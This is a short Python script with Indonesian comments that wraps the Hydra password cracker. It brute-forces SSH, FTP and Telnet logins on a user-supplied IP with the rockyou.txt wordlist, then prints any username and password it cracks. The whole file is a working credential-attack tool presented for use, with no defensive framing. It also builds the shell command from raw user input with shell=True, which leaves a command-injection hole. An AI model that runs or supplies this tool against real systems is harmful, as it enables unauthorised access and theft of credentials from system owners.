import subprocess
import re

# ANSI colors
GREEN = "\033[92m"
RESET = "\033[0m"
BOLD = "\033[1m"

def run_attack(service, target_ip, username, passlist="rockyou.txt", threads=16):
    print(f"{BOLD}[+] Menyerang {service.upper()} | Target: {target_ip} | Username: {username}{RESET}\n")

    cmd = (
        f"hydra -l {username} -P {passlist} {service}://{target_ip} "
        f"-t {threads} -W 1 -f -V"
    )
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    for line in process.stdout:
        decoded = line.decode(errors="ignore").strip()
        print(decoded)  # Bisa di-comment jika mau lebih clean

        # Deteksi hasil sukses login
        match = re.search(r'host:\s*(\S+)\s+login:\s*(\S+)\s+password:\s*(\S+)', decoded)
        if match:
            ip_found = match.group(1)
            user_found = match.group(2)
            pass_found = match.group(3)

            print(f"\n{GREEN}{BOLD}✅ BERHASIL LOGIN!{RESET}")
            print(f"{GREEN}SERVICE : {service.upper()}")
            print(f"USERNAME: {user_found}")
            print(f"PASSWORD: {pass_found}{RESET}\n")

            return True  # Berhasil → hentikan serangan

    return False  # Belum berhasil → lanjut ke service lain

def main():
    print(f"{BOLD}=== HYDRA FAST CLEAN TOOL ==={RESET}")
    target_ip = input("Masukkan IP Target: ")
    username = input("Masukkan Username: ")

    services = ["ssh", "ftp", "telnet"]

    for service in services:
        success = run_attack(service, target_ip, username)
        if success:
            print(f"{GREEN}🛑 Serangan dihentikan karena sudah berhasil login.{RESET}")
            break

    print(f"\n{BOLD}=== Selesai ==={RESET}")

if __name__ == "__main__":
    main()

